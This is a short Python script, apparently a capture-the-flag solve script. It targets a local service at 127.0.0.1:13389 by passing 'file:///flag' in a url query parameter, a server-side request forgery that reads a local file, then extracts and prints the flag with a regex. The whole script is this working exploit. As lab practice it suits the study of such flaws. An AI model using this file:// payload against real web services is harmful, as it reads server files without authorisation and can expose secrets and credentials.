#!/usr/bin/env python3
import requests

BASE = 'http://127.0.0.1:13389'
r = requests.get(f'{BASE}/?url=file:///flag')
if 'flag{' in r.text:
    import re
    flag = re.search(r'flag\{[^}]+\}', r.text).group()
    print(f'[+] {flag}')
else:
    print('[-] flag not found')
